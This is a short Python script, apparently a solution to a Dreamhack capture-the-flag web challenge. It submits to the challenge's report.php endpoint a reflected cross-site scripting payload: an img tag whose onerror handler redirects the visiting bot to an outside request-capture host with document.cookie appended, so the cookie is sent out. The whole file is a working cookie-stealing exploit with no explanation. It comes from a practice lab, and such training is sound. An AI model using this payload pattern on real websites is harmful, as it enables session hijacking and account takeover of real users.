import requests

port = 10010
url_index = f"http://host3.dreamhack.games:{port}/"
url_report = url_index + "report.php"

param = {
    "path": 'vuln.php/?param=<img src=@ onerror=location.href="https://wcageuh.request.dreamhack.games/"%2bdocument.cookie>'
}

r = requests.post(url_report, data=param)
print(r.text)
